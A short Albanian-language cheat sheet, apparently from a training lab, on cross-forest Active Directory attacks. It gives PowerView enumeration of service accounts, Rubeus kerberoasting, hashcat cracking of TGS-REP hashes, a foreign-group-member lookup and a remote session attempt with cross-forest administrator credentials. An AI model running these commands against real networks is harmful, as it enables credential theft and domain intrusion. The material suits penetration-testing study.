
#### **A. Kerberoasting Cross‑Forest**

```bash
# Enumerim i llogarive me SPN në domenin e synuar
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | Select-Object SamAccountName

# Verifikim i një llogarie specifike (p.sh., mssqlsvc)
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | Select-Object samaccountname, memberof

# Kerberoasting ndaj përdoruesit në domenin e synuar
.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# (Opsionale) Kerberoast gjithë domenin e synuar
.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /nowrap

# Cracking i hash-eve TGS-REP (RC4)
# Ruaje hash-in në hash.txt, pastaj:
hashcat -m 13100 hash.txt /path/to/wordlist.txt --force
```



####**B. Password Reuse / Foreign Group Membership**

```bash
# Gjej anëtarë "të huaj" në grupet e domenit të synuar
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Konverto një SID të gjetur në emër llogarie
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

# Provo akses me kredenciale cross-forest (p.sh., Administrator nga forest-i tjetër)
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator
```

Shënim: Për llogari me AES-only, përdor Rubeus me `/ticket:X` ose `/tgtdeleg` për RC4, ose krako me `hashcat -m 19600/19800` sipas etype.